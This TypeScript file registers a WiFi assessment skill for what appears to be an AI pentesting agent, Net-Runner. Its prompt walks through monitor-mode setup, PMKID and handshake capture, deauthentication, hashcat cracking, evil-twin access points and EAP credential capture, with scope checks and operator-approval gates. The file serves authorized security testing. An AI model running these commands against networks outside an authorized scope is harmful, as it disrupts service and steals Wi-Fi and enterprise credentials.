import { getNetRunnerSkillDefinition } from '../../security/skillDefinitions.js'
import { registerBundledSkill } from '../bundledSkills.js'

export function registerWifiAssessmentSkill(): void {
  const definition = getNetRunnerSkillDefinition('wifi-assessment')
  if (!definition) throw new Error('Missing Net-Runner skill definition: wifi-assessment')

  registerBundledSkill({
    name: definition.name,
    description: definition.description,
    allowedTools: ['Bash', 'Read', 'Write', 'TodoWrite', 'Grep', 'Glob', 'ListMcpResourcesTool', 'ReadMcpResourceTool'],
    argumentHint: '[target SSID, BSSID, or engagement identifier]',
    async getPromptForCommand(args) {
      return [
        {
          type: 'text',
          text: `# WiFi Assessment

Structured 802.11 wireless assessment. Passive-first approach: enumerate before attacking. Require operator approval before active attacks (deauth, evil-twin).

Input:
${args || 'No SSID, BSSID, or engagement identifier supplied. Ask for the authorized wireless target and scope before proceeding.'}

Execution:

## 1. Scope and manifest
1. Run \`nr_engagement_status\` and halt if \`nr_scope_check\` returns block.
2. Create evidence directory: \`.netrunner/artifacts/wifi/<engagement-slug>/\`.

## 2. Monitor-mode interface setup
\`\`\`
# Identify wireless interfaces
iwconfig
iw dev

# Kill conflicting processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start <interface>
# e.g. sudo airmon-ng start wlan0 → creates wlan0mon

# Verify monitor mode
iwconfig wlan0mon
\`\`\`
Record interface name, driver, and chipset in the evidence log.

## 3. AP and client discovery (passive)
\`\`\`
# Full passive survey — all channels, 60-second minimum
sudo airodump-ng wlan0mon --output-format csv,kismet --write .netrunner/artifacts/wifi/<slug>/survey wlan0mon

# Save networks.json from CSV output
\`\`\`
Parse survey output and write \`.netrunner/artifacts/wifi/<slug>/networks.json\` with fields:
\`bssid\`, \`ssid\`, \`channel\`, \`encryption\`, \`signal\`, \`clients\`.

For deeper passive survey use Kismet:
\`\`\`
sudo kismet --no-ncurses -c wlan0mon --log-prefix .netrunner/artifacts/wifi/<slug>/kismet
\`\`\`

## 4. Targeted capture (PMKID — preferred, no deauth required)
\`\`\`
# Capture PMKID via hcxdumptool (passive-adjacent, no deauth)
sudo hcxdumptool -i wlan0mon --enable_status=1 -o .netrunner/artifacts/wifi/<slug>/pmkid.pcapng \
  --filterlist_ap=<bssid-list-file> --filtermode=2

# Convert pcapng to hashcat format
hcxpcapngtool -o .netrunner/artifacts/wifi/<slug>/hashes.hc22000 \
  .netrunner/artifacts/wifi/<slug>/pmkid.pcapng

# Verify PMKID hashes were captured
grep -c "^" .netrunner/artifacts/wifi/<slug>/hashes.hc22000
\`\`\`

## 5. WPA/WPA2 handshake capture (fallback or when PMKID unavailable)
\`\`\`
# Target-specific capture — lock channel to reduce noise
sudo airodump-ng -c <channel> --bssid <target-bssid> \
  -w .netrunner/artifacts/wifi/<slug>/handshake wlan0mon

# Monitor for 4-way handshake in output (WPA handshake line)
# If no natural handshake within timeout, evaluate deauth (requires operator approval — see step 6)
\`\`\`

## 6. Deauthentication (ACTIVE — requires explicit operator approval)
**Only proceed with deauth after confirming explicit operator approval and passing scope-guard check.**
\`\`\`
nr_scope_check "deauth attack against <bssid>"
# Proceed only on explicit allow

# Targeted deauth (1 client)
sudo aireplay-ng --deauth 5 -a <bssid> -c <client-mac> wlan0mon

# Broadcast deauth (more disruptive — higher approval bar)
sudo aireplay-ng --deauth 5 -a <bssid> wlan0mon
\`\`\`
Document approval status, time, and operator identity before executing.

## 7. Offline cracking (hashcat)
\`\`\`
# PMKID / EAPOL unified (mode 22000 — preferred for modern captures)
hashcat -m 22000 .netrunner/artifacts/wifi/<slug>/hashes.hc22000 <wordlist> \
  --outfile .netrunner/artifacts/wifi/<slug>/cracked.txt -O

# Legacy EAPOL handshake (mode 2500 — for older cap/hccapx files)
hashcat -m 2500 .netrunner/artifacts/wifi/<slug>/handshake.hccapx <wordlist> \
  --outfile .netrunner/artifacts/wifi/<slug>/cracked-legacy.txt -O

# Rule-based mutation
hashcat -m 22000 .netrunner/artifacts/wifi/<slug>/hashes.hc22000 <wordlist> \
  -r /usr/share/hashcat/rules/best64.rule --outfile .netrunner/artifacts/wifi/<slug>/cracked-rules.txt -O
\`\`\`
Save cracked credentials only as metadata (existence confirmed, value redacted) in the finding.

## 8. Evil-twin and rogue AP (ACTIVE — requires explicit operator approval)
**Only proceed with evil-twin after explicit operator approval and scope-guard confirmation.**
\`\`\`
nr_scope_check "evil-twin / rogue AP against <ssid>"

# Option A: hostapd-wpe for WPA-Enterprise credential capture
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Option B: bettercap WiFi module
sudo bettercap -iface wlan0mon -eval \
  "wifi.recon on; set wifi.ap.ssid <target-ssid>; wifi.ap on"
\`\`\`

## 9. EAP misconfiguration testing (eaphammer)
\`\`\`
# Only against authorized WPA-Enterprise targets
sudo eaphammer -i wlan0mon --channel <channel> --auth wpa-eap \
  --essid <target-ssid> --creds \
  --output .netrunner/artifacts/wifi/<slug>/eap-creds.txt
\`\`\`
Tests: EAP-MD5 (credentials in cleartext), PEAP/MSCHAPv2 downgrade, certificate validation bypass.

## 10. Output and findings
- \`.netrunner/artifacts/wifi/<slug>/networks.json\` — AP/client inventory
- \`.netrunner/artifacts/wifi/<slug>/hashes.hc22000\` — captured PMKID/EAPOL hashes
- \`.netrunner/artifacts/wifi/<slug>/cracked.txt\` — cracking results (redact PSK values in findings)
- \`.netrunner/artifacts/wifi/<slug>/eap-creds.txt\` — EAP credential captures
- Call \`nr_save_finding\` for each confirmed finding with MITRE technique ID:
  - Weak/default PSK → T1110 (Brute Force)
  - Handshake/PMKID capture → T1040 (Network Sniffing)
  - Evil-twin credential capture → T1557.001 (LLMNR/NBT-NS Poisoning / AiTM)
  - EAP misconfiguration → T1040 / T1110
- Call \`nr_save_note\` with survey summary, attack phase log, and gaps.

## 11. Interface cleanup
\`\`\`
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager   # or equivalent
\`\`\`

Output summary:
- Scope decision
- Interface and monitor-mode status
- AP/client inventory (count, encryption types)
- Handshake/PMKID capture status
- Cracking results (redacted)
- Active attack approval status
- EAP findings
- Gaps requiring additional on-site time`,
        },
      ]
    },
  })
}
